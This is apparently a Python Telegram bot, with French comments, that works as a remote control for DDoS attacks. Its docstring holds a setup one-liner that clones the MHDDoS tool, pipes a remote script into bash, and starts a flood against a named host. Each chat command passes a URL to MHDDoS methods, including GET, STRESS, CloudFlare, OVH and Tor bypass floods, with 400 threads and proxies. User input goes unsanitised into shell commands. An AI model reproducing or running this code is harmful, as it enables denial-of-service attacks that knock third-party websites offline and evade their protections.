"""
/usr/bin/python3 -m pip install --upgrade pip
pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET panpan-bot1.glitch.me 1 100 mhddos_proxy/list 100 5
"""

import requests
import telegram
#from telegram import Update
from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filters
from telegram.update import Update
import re 
import os
import subprocess
import concurrent.futures


#Telegram token
token = os.getenv('TELEGRAM_TOKEN')
bot_number = os.getenv('NUM')
updater = Updater(token,use_context=True)
s = 360


def start(update: Update, context: CallbackContext):
  update.message.reply_text(f"DDOS BOT {bot_number}")
  
  
def tmps(update: Update, context: CallbackContext):
  global s
  s = update.message.text.replace('/t', '')
  update.message.reply_text(f"Ok pour run pour {s} s")
  
 

  
def ddos_start(url):
  subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)

def ddos(update: Update, context: CallbackContext):
  url = update.message.text.replace('/ddos', '')
  update.message.reply_text(f"METHOD: GET L7 THREADS : 400 pour: {s} s")
  with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
    futures = []
    for _ in url:
      futures.append(executor.submit(ddos_start, url))
      chat_id = str(update.effective_user.id)




def google_bot(update: Update, context: CallbackContext):
  url = update.message.text.replace('/bot', '')
  update.message.reply_text(f"METHOD: BOT L7 THREADS : 400\n\nBOT: Like Google bot pour: {s} s")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py BOT {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )       

      
def STRESS(update: Update, context: CallbackContext):
  url = update.message.text.replace('/stress', '')
  update.message.reply_text(f"METHOD: STRESS L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte pour: {s} s")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py STRESS {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )
      
def CFB(update: Update, context: CallbackContext):
  url = update.message.text.replace('/CFB', '')
  update.message.reply_text(f"METHOD: CFB L7 THREADS : 400\n\nCFB: CloudFlare Bypass (Ajoute des user-agents) pour: {s} s")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py CFB {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )  
      
def CFBUAM(update: Update, context: CallbackContext):
  url = update.message.text.replace('/CFBUAM', '')
  update.message.reply_text(f"METHOD: CFBUAM L7 THREADS : 400\n\nCFBUAM: CloudFlare Under Attack Mode Bypass (Met un referrer : facebook.com//lesite.com ou un site du genre pour bypass) pour: {s} s")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py CFBUAM {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )    
      
def TOR(update: Update, context: CallbackContext):
  url = update.message.text.replace('/tor', '')
  update.message.reply_text(f"METHOD: CFB L7 THREADS : 400\n\nTOR: Bypass onion website pour: {s} s")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py TOR {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )        
      
def OVH(update: Update, context: CallbackContext):
  url = update.message.text.replace('/ovh', '')
  update.message.reply_text(f"METHOD: OVH L7 THREADS : 400\n\nOVH: Bypass OVH pour: {s} s")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py OVH {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )        
            
      
      

#Trigger des fonctions
updater.dispatcher.add_handler(CommandHandler('t', tmps))

updater.dispatcher.add_handler(CommandHandler('ddos', ddos))
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('bot', google_bot))
updater.dispatcher.add_handler(CommandHandler('stress', STRESS))
updater.dispatcher.add_handler(CommandHandler('cfb', CFB))
updater.dispatcher.add_handler(CommandHandler('cfbuam', CFBUAM))
updater.dispatcher.add_handler(CommandHandler('tor', TOR))
updater.dispatcher.add_handler(CommandHandler('ovh', OVH))
#Run the bot
updater.start_polling()
